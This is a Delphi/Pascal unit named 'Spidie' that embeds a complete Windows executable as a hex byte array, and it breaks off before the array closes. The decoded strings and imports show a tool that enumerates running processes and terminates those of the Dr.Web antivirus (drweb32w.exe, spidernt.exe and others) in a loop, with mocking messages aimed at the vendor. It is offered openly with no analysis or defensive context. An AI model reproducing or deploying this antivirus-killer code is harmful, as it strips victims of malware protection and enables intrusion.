{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows,
  WinNative,
  RTL,
  LDasm;

{$R version.res}

implementation

var
  tmp2: LBuf;

const
  hinst = $00410000;
  SpiDiE14: PWideChar = 'SpiDiE 1.4';

  data: array[0..5119] of byte = (
    $4D, $5A, $50, $00, $02, $00, $00, $00, $04, $00, $0F, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $1A, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $00,
    $BA, $10, $00, $0E, $1F, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $90, $90,
    $54, $68, $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $6D, $75, $73,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $75, $6E, $64, $65, $72, $20, $57,
    $69, $6E, $33, $32, $0D, $0A, $24, $37, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $06, $00, $19, $5E, $42, $2A, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $8E, $A1, $0B, $01, $02, $19, $00, $08, $00, $00,
    $00, $08, $00, $00, $00, $00, $00, $00, $78, $17, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $01, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00,
    $00, $70, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $02, $00, $00, $00,
    $00, $00, $10, $00, $00, $40, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $FE, $01, $00, $00, $00, $60, $00, $00, $00, $02, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $A4, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $43, $4F, $44, $45, $00, $00, $00, $00,
    $90, $07, $00, $00, $00, $10, $00, $00, $00, $08, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $60,
    $44, $41, $54, $41, $00, $00, $00, $00, $4C, $00, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $42, $53, $53, $00, $00, $00, $00, $00,
    $25, $05, $00, $00, $00, $30, $00, $00, $00, $00, $00, $00, $00, $0E, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C0,
    $2E, $69, $64, $61, $74, $61, $00, $00, $FE, $01, $00, $00, $00, $40, $00, $00,
    $00, $02, $00, $00, $00, $0E, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $A4, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $2E, $72, $73, $72, $63, $00, $00, $00, $00, $02, $00, $00, $00, $60, $00, $00,
    $00, $02, $00, $00, $00, $12, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $70, $00, $00, $00, $00, $00, $00, $00, $14, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $69, $15, $00, $30, $40, $00, $05, $84, $08, $08, $42, $89, $15, $00, $30, $40,
    $00, $F7, $E2, $89, $D0, $C3, $8B, $C0, $FF, $25, $4C, $40, $40, $00, $8B, $C0,
    $FF, $25, $48, $40, $40, $00, $8B, $C0, $FF, $25, $44, $40, $40, $00, $8B, $C0,
    $FF, $25, $40, $40, $40, $00, $8B, $C0, $FF, $25, $3C, $40, $40, $00, $8B, $C0,
    $66, $83, $F8, $61, $7C, $0A, $66, $83, $F8, $7A, $7F, $04, $66, $25, $DF, $00,
    $C3, $8D, $40, $00, $89, $FA, $89, $C7, $83, $C9, $FF, $31, $C0, $66, $F2, $AF,
    $8D, $47, $FE, $89, $D7, $C3, $8B, $C0, $57, $56, $89, $C6, $89, $D7, $83, $C9,
    $FF, $31, $C0, $66, $F2, $AF, $F7, $D1, $01, $C9, $89, $F7, $89, $D6, $89, $F8,
    $89, $CA, $C1, $E9, $02, $F2, $A5, $89, $D1, $83, $E1, $03, $F2, $A4, $5E, $5F,
    $C3, $8D, $40, $00, $53, $56, $57, $55, $51, $89, $14, $24, $8B, $E8, $33, $FF,
    $33, $F6, $66, $8B, $44, $75, $00, $E8, $94, $FF, $FF, $FF, $8B, $D8, $8B, $04,
    $24, $66, $8B, $04, $70, $E8, $86, $FF, $FF, $FF, $66, $3B, $C3, $73, $07, $BF,
    $01, $00, $00, $00, $EB, $08, $66, $3B, $C3, $76, $03, $83, $CF, $FF, $66, $85,
    $D8, $74, $05, $46, $85, $FF, $74, $CA, $8B, $C7, $5A, $5D, $5F, $5E, $5B, $C3,
    $57, $89, $C7, $89, $D1, $C1, $E9, $02, $31, $C0, $F2, $AB, $89, $D1, $83, $E1,
    $03, $F2, $AA, $5F, $C3, $8D, $40, $00, $30, $00, $31, $00, $32, $00, $33, $00,
    $34, $00, $35, $00, $36, $00, $37, $00, $38, $00, $39, $00, $41, $00, $42, $00,
    $43, $00, $44, $00, $45, $00, $46, $00, $00, $00, $00, $00, $55, $8B, $EC, $53,
    $56, $57, $8B, $55, $0C, $8B, $5D, $08, $8B, $F2, $66, $C7, $42, $10, $00, $00,
    $33, $C0, $B9, $07, $00, $00, $00, $2B, $C8, $C1, $E1, $02, $8B, $FB, $D3, $EF,
    $83, $E7, $0F, $8B, $0D, $00, $20, $40, $00, $66, $8B, $0C, $79, $66, $89, $0C,
    $42, $40, $83, $F8, $08, $75, $DB, $8B, $C6, $5F, $5E, $5B, $5D, $C2, $08, $00,
    $FF, $25, $80, $40, $40, $00, $8B, $C0, $FF, $25, $7C, $40, $40, $00, $8B, $C0,
    $FF, $25, $78, $40, $40, $00, $8B, $C0, $FF, $25, $74, $40, $40, $00, $8B, $C0,
    $FF, $25, $70, $40, $40, $00, $8B, $C0, $FF, $25, $6C, $40, $40, $00, $8B, $C0,
    $FF, $25, $68, $40, $40, $00, $8B, $C0, $FF, $25, $64, $40, $40, $00, $8B, $C0,
    $FF, $25, $60, $40, $40, $00, $8B, $C0, $FF, $25, $5C, $40, $40, $00, $8B, $C0,
    $FF, $25, $58, $40, $40, $00, $8B, $C0, $FF, $25, $54, $40, $40, $00, $8B, $C0,
    $55, $8B, $EC, $53, $C7, $00, $18, $00, $00, $00, $8B, $5D, $10, $89, $58, $04,
    $89, $50, $08, $89, $48, $0C, $8B, $55, $0C, $89, $50, $10, $8B, $55, $08, $89,
    $50, $14, $5B, $5D, $C2, $0C, $00, $90, $64, $8B, $05, $18, $00, $00, $00, $8B,
    $40, $20, $C3, $90, $55, $8B, $EC, $83, $C4, $F8, $69, $45, $08, $10, $27, $00,
    $00, $F7, $D8, $99, $89, $45, $F8, $89, $55, $FC, $8D, $45, $F8, $50, $6A, $00,
    $E8, $A3, $FF, $FF, $FF, $59, $59, $5D, $C2, $04, $00, $90, $54, $00, $65, $00,
    $72, $00, $6D, $00, $69, $00, $6E, $00, $61, $00, $74, $00, $69, $00, $6E, $00,
    $67, $00, $20, $00, $62, $00, $79, $00, $20, $00, $68, $00, $61, $00, $6E, $00,
    $64, $00, $6C, $00, $65, $00, $20, $00, $30, $00, $78, $00, $00, $00, $00, $00,
    $57, $00, $68, $00, $6F, $00, $75, $00, $70, $00, $73, $00, $20, $00, $49, $00,
    $20, $00, $64, $00, $69, $00, $64, $00, $20, $00, $69, $00, $74, $00, $20, $00,
    $61, $00, $67, $00, $61, $00, $69, $00, $6E, $00, $20, $00, $7D, $00, $3A, $00,
    $29, $00, $00, $00, $42, $00, $6F, $00, $6E, $00, $6A, $00, $6F, $00, $75, $00,
    $72, $00, $6E, $00, $6F, $00, $21, $00, $00, $00, $00, $00, $5C, $00, $42, $00,
    $61, $00, $73, $00, $65, $00, $4E, $00, $61, $00, $6D, $00, $65, $00, $64, $00,
    $4F, $00, $62, $00, $6A, $00, $65, $00, $63, $00, $74, $00, $73, $00, $5C, $00,
    $64, $00, $77, $00, $75, $00, $6E, $00, $70, $00, $72, $00, $6F, $00, $74, $00,
    $77, $00, $61, $00, $69, $00, $74, $00, $00, $00, $00, $00, $42, $00, $79, $00,
    $20, $00, $62, $00, $75, $00, $79, $00, $69, $00, $6E, $00, $67, $00, $20, $00,
    $44, $00, $72, $00, $2E, $00, $57, $00, $65, $00, $62, $00, $20, $00, $79, $00,
    $6F, $00, $75, $00, $20, $00, $61, $00, $72, $00, $65, $00, $20, $00, $73, $00,
    $75, $00, $70, $00, $70, $00, $6F, $00, $72, $00, $74, $00, $69, $00, $6E, $00,
    $67, $00, $20, $00, $43, $00, $6F, $00, $6D, $00, $6D, $00, $75, $00, $6E, $00,
    $69, $00, $73, $00, $6D, $00, $20, $00, $7D, $00, $3A, $00, $29, $00, $00, $00,
    $56, $00, $6F, $00, $64, $00, $6B, $00, $61, $00, $20, $00, $2D, $00, $20, $00,
    $44, $00, $61, $00, $6E, $00, $69, $00, $6C, $00, $6F, $00, $66, $00, $66, $00,
    $21, $00, $00, $00, $50, $00, $65, $00, $72, $00, $65, $00, $73, $00, $74, $00,
    $72, $00, $6F, $00, $79, $00, $6B, $00, $61, $00, $20, $00, $2D, $00, $20, $00,
    $4B, $00, $6F, $00, $6D, $00, $61, $00, $72, $00, $6F, $00, $76, $00, $21, $00,
    $00, $00, $00, $00, $43, $00, $6F, $00, $6D, $00, $6D, $00, $75, $00, $6E, $00,
    $69, $00, $73, $00, $6D, $00, $20, $00, $2D, $00, $20, $00, $47, $00, $6C, $00,
    $61, $00, $64, $00, $6B, $00, $69, $00, $68, $00, $21, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $64, $00, $72, $00, $77, $00, $65, $00, $62, $00, $33, $00,
    $32, $00, $77, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00,
    $64, $00, $77, $00, $65, $00, $6E, $00, $67, $00, $69, $00, $6E, $00, $65, $00,
    $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00, $73, $00, $70, $00,
    $69, $00, $64, $00, $65, $00, $72, $00, $6D, $00, $6C, $00, $2E, $00, $65, $00,
    $78, $00, $65, $00, $00, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00,
    $65, $00, $72, $00, $6E, $00, $74, $00, $2E, $00, $65, $00, $78, $00, $65, $00,
    $00, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00,
    $75, $00, $69, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00,
    $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00, $67, $00, $61, $00,
    $74, $00, $65, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00,
    $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00, $61, $00, $67, $00,
    $65, $00, $6E, $00, $74, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00,
    $53, $56, $57, $55, $83, $C4, $E0, $BD, $C8, $30, $40, $00, $33, $C0, $A3, $44,
    $20, $40, $00, $B8, $0C, $30, $40, $00, $BA, $1C, $00, $00, $00, $E8, $2E, $FC,
    $FF, $FF, $B8, $28, $30, $40, $00, $BA, $A0, $00, $00, $00, $E8, $1F, $FC, $FF,
    $FF, $33, $FF, $C7, $45, $00, $2C, $02, $00, $00, $6A, $00, $6A, $02, $E8, $45,
    $FB, $FF, $FF, $A3, $F4, $32, $40, $00, $83, $3D, $F4, $32, $40, $00, $FF, $74,
    $59, $55, $A1, $F4, $32, $40, $00, $50, $E8, $33, $FB, $FF, $FF, $85, $C0, $74,
    $3E, $83, $FF, $06, $74, $39, $BE, $07, $00, $00, $00, $BB, $28, $20, $40, $00,
    $8D, $45, $24, $8B, $13, $E8, $8A, $FB, $FF, $FF, $85, $C0, $75, $0B, $8B, $45,
    $08, $89, $04, $BD, $0C, $30, $40, $00, $47, $83, $C3, $04, $4E, $75, $E1, $55,
    $A1, $F4, $32, $40, $00, $50, $E8, $FD, $FA, $FF, $FF, $85, $C0, $75, $C2, $A1,
    $F4, $32, $40, $00, $50, $E8, $F6, $FA, $FF, $FF, $C7, $04, $24, $00, $00, $40,
    $00, $33, $C0, $89, $44, $24, $04, $6A, $04, $68, $00, $10, $00, $00, $8D, $44,
    $24, $08, $50, $6A, $00, $8D, $44, $24, $14, $50, $6A, $FF, $E8, $47, $FC, $FF,
    $FF, $83, $7C, $24, $04, $00, $0F, $84, $A5, $00, $00, $00, $54, $68, $00, $00,
    $40, $00, $8B, $44, $24, $0C, $50, $6A, $10, $E8, $12, $FC, $FF, $FF, $8B, $44,
    $24, $04, $8B, $38, $4F, $85, $FF, $7C, $6D, $47, $33, $DB, $E8, $57, $FC, $FF,
    $FF, $8B, $F3, $03, $F6, $8B, $54, $24, $04, $3B, $44, $F2, $04, $75, $53, $8B,
    $44, $24, $04, $80, $7C, $F0, $08, $05, $75, $48, $8B, $44, $24, $04, $0F, $B7,
    $6C, $F0, $0A, $54, $6A, $18, $8D, $44, $24, $10, $50, $6A, $00, $55, $E8, $BD,
    $FB, $FF, $FF, $85, $C0, $75, $2B, $BE, $07, $00, $00, $00, $B8, $0C, $30, $40,
    $00, $8B, $10, $3B, $54, $24, $18, $75, $13, $8B, $15, $44, $20, $40, $00, $89,
    $2C, $95, $28, $30, $40, $00, $FF, $05, $44, $20, $40, $00, $83, $C0, $04, $4E,
    $75, $DF, $43, $4F, $75, $96, $33, $C0, $89, $04, $24, $68, $00, $80, $00, $00,
    $8D, $44, $24, $04, $50, $8D, $44, $24, $0C, $50, $6A, $FF, $E8, $9F, $FB, $FF,
    $FF, $83, $C4, $20, $5D, $5F, $5E, $5B, $C3, $8D, $40, $00, $53, $56, $57, $BF,
    $F8, $32, $40, $00, $8B, $35, $44, $20, $40, $00, $4E, $85, $F6, $7C, $50, $46,
    $BB, $28, $30, $40, $00, $8B, $C7, $8B, $15, $04, $20, $40, $00, $E8, $26, $FA,
    $FF, $FF, $8B, $C7, $E8, $0B, $FA, $FF, $FF, $50, $8B, $03, $50, $E8, $CA, $FA,
    $FF, $FF, $57, $E8, $E0, $F9, $FF, $FF, $6A, $00, $8B, $03, $50, $E8, $36, $FB,
    $FF, $FF, $85, $C0, $75, $0B, $A1, $08, $20, $40, $00, $50, $E8, $C7, $F9, $FF,
    $FF, $8B, $03, $50, $E8, $27, $FB, $FF, $FF, $83, $C3, $04, $4E, $75, $B6, $5F,
    $5E, $5B, $C3, $90, $83, $C4, $E8, $54, $E8, $FB, $FA, $FF, $FF, $8D, $44, $24,
    $08, $50, $8D, $44, $24, $04, $50, $E8, $DC, $FA, $FF, $FF, $0F, $B7, $44, $24,
    $0E, $6B, $C0, $3C, $0F, $B7, $54, $24, $10, $03, $C2, $6B, $C0, $3C, $0F, $B7,
    $54, $24, $12, $03, $C2, $6B, $C0, $64, $0F, $B7, $54, $24, $14, $03, $C2, $8B,
    $15, $48, $20, $40, $00, $89, $02, $83, $C4, $18, $C3, $90, $A1, $0C, $20, $40,
    $00, $50, $E8, $61, $F9, $FF, $FF, $33, $C0, $A3, $00, $35, $40, $00, $A1, $10,
    $20, $40, $00, $50, $68, $1C, $35, $40, $00, $E8, $82, $FA, $FF, $FF, $6A, $00,
    $6A, $00, $6A, $00, $BA, $1C, $35, $40, $00, $B8, $04, $35, $40, $00, $B9, $40,
    $00, $00, $00, $E8, $B8, $FA, $FF, $FF, $68, $04, $35, $40, $00, $68, $03, $00,
    $1F, $00, $68, $00, $35, $40, $00, $E8, $44, $FA, $FF, $FF, $85, $C0, $75, $54,
    $E8, $6B, $FD, $FF, $FF, $E8, $F2, $FE, $FF, $FF, $6A, $00, $A1, $00, $35, $40,
    $00, $50, $E8, $31, $FA, $FF, $FF, $A1, $00, $35, $40, $00, $50, $E8, $5E, $FA,
    $FF, $FF, $E8, $3D, $FF, $FF, $FF, $68, $88, $13, $00, $00, $E8, $A3, $FA, $FF,
    $FF, $E8, $3A, $FD, $FF, $FF, $E8, $C1, $FE, $FF, $FF, $B8, $04, $00, $00, $00,
    $E8, $9B, $F8, $FF, $FF, $8B, $04, $85, $14, $20, $40, $00, $50, $E8, $C6, $F8,
    $FF, $FF, $EB, $D3, $C3, $8D, $40, $00, $83, $2D, $08, $30, $40, $00, $01, $73,
    $0B, $E8, $46, $FF, $FF, $FF, $31, $C0, $40, $C2, $0C, $00, $C3, $8D, $40, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $F8, $10, $40, $00, $1C, $12, $40, $00, $50, $12, $40, $00, $84, $12, $40, $00,
    $9C, $12, $40, $00, $DC, $12, $40, $00, $40, $13, $40, $00, $64, $13, $40, $00,
    $94, $13, $40, $00, $C0, $13, $40, $00, $C4, $13, $40, $00, $E0, $13, $40, $00,
    $FC, $13, $40, $00, $18, $14, $40, $00, $34, $14, $40, $00, $50, $14, $40, $00,
    $70, $14, $40, $00, $00, $00, $00, $00, $00, $30, $40, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $88, $40, $00, $00,
    $3C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $FA, $40, $00, $00, $54, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $96, $40, $00, $00,
    $AC, $40, $00, $00, $BA, $40, $00, $00, $CC, $40, $00, $00, $DE, $40, $00, $00,
    $00, $00, $00, $00, $04, $41, $00, $00, $18, $41, $00, $00, $2E, $41, $00, $00,
    $48, $41, $00, $00, $52, $41, $00, $00, $68, $41, $00, $00, $84, $41, $00, $00,
    $98, $41, $00, $00, $B4, $41, $00, $00, $CA, $41, $00, $00, $E2, $41, $00, $00,
    $F0, $41, $00, $00, $00, $00, $00, $00, $6B, $65, $72, $6E, $65, $6C, $33, $32,
    $2E, $64, $6C, $6C, $00, $00, $00, $00, $4F, $75, $74, $70, $75, $74, $44, $65,
    $62, $75, $67, $53, $74, $72, $69, $6E, $67, $57, $00, $00, $00, $00, $43, $6C,
    $6F, $73, $65, $48, $61, $6E, $64, $6C, $65, $00, $00, $00, $50, $72, $6F, $63,
    $65, $73, $73, $33, $32, $4E, $65, $78, $74, $57, $00, $00, $00, $00, $50, $72,
    $6F, $63, $65, $73, $73, $33, $32, $46, $69, $72, $73, $74, $57, $00, $00, $00,
    $43, $72, $65, $61, $74, $65, $54, $6F, $6F, $6C, $68, $65, $6C, $70, $33, $32,
    $53, $6E, $61, $70, $73, $68, $6F, $74, $00, $00, $6E, $74, $64, $6C, $6C, $2E,
    $64, $6C, $6C, $00, $00, $00, $5A, $77, $44, $65, $6C, $61, $79, $45, $78, $65,
    $63, $75, $74, $69, $6F, $6E, $00, $00, $00, $00, $5A, $77, $46, $72, $65, $65,
    $56, $69, $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72, $79, $00, $00, $00,
    $5A, $77, $41, $6C, $6C, $6F, $63, $61, $74, $65, $56, $69, $72, $74, $75, $61,
    $6C, $4D, $65, $6D, $6F, $72, $79, $00, $00, $00, $5A, $77, $43, $6C, $6F, $73,
    $65, $00, $00, $00, $5A, $77, $54, $65, $72, $6D, $69, $6E, $61, $74, $65, $50,
    $72, $6F, $63, $65, $73, $73, $00, $00, $00, $00, $5A, $77, $51, $75, $65, $72,
    $79, $53, $79, $73, $74, $65, $6D, $49, $6E, $66, $6F, $72, $6D, $61, $74, $69,
    $6F, $6E, $00, $00, $00, $00, $5A, $77, $51, $75, $65, $72, $79, $53, $79, $73,
    $74, $65, $6D, $54, $69, $6D, $65, $00, $00, $00, $5A, $77, $51, $75, $65, $72,
    $79, $49, $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E, $50, $72, $6F, $63,
    $65, $73, $73, $00, $00, $00, $52, $74, $6C, $54, $69, $6D, $65, $54, $6F, $54,
    $69, $6D, $65, $46, $69, $65, $6C, $64, $73, $00, $00, $00, $52, $74, $6C, $49,
    $6E, $69, $74, $55, $6E, $69, $63, $6F, $64, $65, $53, $74, $72, $69, $6E, $67,
    $00, $00, $00, $00, $5A, $77, $53, $65, $74, $45, $76, $65, $6E, $74, $00, $00,
    $00, $00, $5A, $77, $4F, $70, $65, $6E, $45, $76, $65, $6E, $74, $00, $00, $00,
    $00, $10, $00, $00, $74, $00, $00, $00, $02, $30, $0D, $30, $1A, $30, $22, $30,
    $2A, $30, $32, $30, $3A, $30, $45, $31, $62, $31, $6A, $31, $72, $31, $7A, $31,
    $82, $31, $8A, $31, $92, $31, $9A, $31, $A2, $31, $AA, $31, $B2, $31, $BA, $31,
    $98, $34, $9F, $34, $A4, $34, $B3, $34, $D4, $34, $DA, $34, $E3, $34, $FC, $34,
    $14, $35, $21, $35, $30, $35, $CD, $35, $DB, $35, $E2, $35, $E8, $35, $20, $36,
    $26, $36, $31, $36, $39, $36, $67, $36, $C1, $36, $CD, $36, $DA, $36, $DF, $36,
    $E5, $36, $F5, $36, $FA, $36, $09, $37, $13, $37, $2D, $37, $38, $37, $68, $37,
    $7A, $37, $00, $00, $00, $20, $00, $00, $30, $00, $00, $00, $00, $30, $04, $30,
    $08, $30, $0C, $30, $10, $30, $14, $30, $18, $30, $1C, $30, $20, $30, $24, $30,
    $28, $30, $2C, $30, $30, $30, $34, $30, $38, $30, $3C, $30, $40, $30, $48, $30,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
